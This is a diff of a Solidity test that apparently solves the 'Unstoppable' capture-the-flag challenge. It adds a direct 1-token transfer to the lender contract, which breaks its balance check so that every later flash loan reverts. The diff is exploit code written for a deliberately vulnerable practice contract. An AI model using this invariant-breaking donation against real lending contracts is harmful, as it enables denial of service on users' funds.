@@ -29,12 +29,13 @@ contract ContractTest is DSTest {
         unstoppableLender.depositTokens(1000000);
         
         damnValuableToken.transfer(address(this), 100);
-
-        receiverUnstoppable.executeFlashLoan(10);
     }
 
-    function testExample() public {
-        vm.expectRevert("Transfer of tokens failed");
+    function testUnstoppable() public {
+        //damnValuableToken.approve(address(unstoppableLender), 1);
+        damnValuableToken.transfer(address(unstoppableLender), 1);
+        damnValuableToken.approve(address(receiverUnstoppable), 10);
+        vm.expectRevert("");
         receiverUnstoppable.executeFlashLoan(10);
     }
 }
